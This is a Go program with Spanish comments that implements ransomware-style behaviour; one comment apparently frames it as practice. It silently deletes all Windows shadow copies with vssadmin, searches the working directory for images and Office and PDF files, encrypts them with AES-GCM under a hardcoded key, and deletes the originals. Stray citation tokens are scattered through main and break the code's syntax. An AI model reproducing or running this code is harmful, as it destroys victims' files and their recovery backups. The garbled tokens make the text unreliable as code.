package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Clave de cifrado AES estática definida en el código
var hardcodedKey = []byte("0123456789abcdef0123456789abcdef")

// manageShadowCopies interactúa con vssadmin para eliminar las copias de respaldo
func manageShadowCopies() {
	deleteCmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	deleteCmd.Stdout = os.Stdout
	deleteCmd.Stderr = os.Stderr
	_ = deleteCmd.Run() // Se ejecuta de forma silenciosa para la práctica
}

// findFilesWithExtensions busca de forma recursiva archivos que coincidan con las extensiones
func findFilesWithExtensions(rootDir string, extensions []string) []string {
	var foundFiles []string

	filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		for _, ext := range extensions {
			if strings.HasSuffix(strings.ToLower(path), strings.ToLower(ext)) {
				foundFiles = append(foundFiles, path)
				break
			}
		}
		return nil
	})

	return foundFiles
}

// encryptFiles recorre el directorio raíz y cifra los archivos utilizando AES-GCM
func encryptFiles(rootDir string, extensions []string) error {
	block, err := aes.NewCipher(hardcodedKey)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	return filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		// Verificar si el fichero coincide con alguna de las extensiones objetivo
		match := false
		for _, ext := range extensions {
			if strings.HasSuffix(strings.ToLower(path), strings.ToLower(ext)) {
				match = true
				break
			}
		}

		if match {
			// 1. Leer el archivo original
			plaintext, readErr := os.ReadFile(path)
			if readErr != nil {
				return readErr
			}

			// 2. Generar Nonce aleatorio único
			nonce := make([]byte, gcm.NonceSize())
			if _, randErr := io.ReadFull(rand.Reader, nonce); randErr != nil {
				return randErr
			}

			// 3. Cifrar el contenido
			ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

			// 4. Guardar con la extensión adicional .enc y eliminar el archivo plano original
			writeErr := os.WriteFile(path+".enc", ciphertext, 0644)
			if writeErr != nil {
				return writeErr
			}
			_ = os.Remove(path)
		}
		return nil
	})
}

func main() {
	// Llamar a la función para gestionar copias shadow[cite: 5]
	manageShadowCopies()

	// Definir las extensiones de archivo a buscar[cite: 5]
	extensions := []string{".jpg", ".jpeg", ".png", ".gif", ".docx", ".xlsx", ".pptx", ".pdf"}

	// Obtener la ruta del directorio raíz[cite: 5]
	rootDir, err := os.Getwd()
	if err != nil {
		panic(err)[cite: 5]
	}

	// Llamar a la función para encontrar archivos con extensiones específicas[cite: 5]
	foundFiles := findFilesWithExtensions(rootDir, extensions)

	// Imprimir las rutas de los archivos encontrados[cite: 5]
	fmt.Println("Archivos encontrados:")[cite: 5]
	for _, file := range foundFiles {   [cite: 5]
	fmt.Println(file)[cite: 5]
	}

	// Llamar a la función para cifrar archivos con extensiones específicas[cite: 5]
	if err := encryptFiles(rootDir, extensions); err != nil {[cite: 5]
	panic(err)[cite: 5]
	}

	fmt.Println("Cifrado completado.")[cite: 5]
}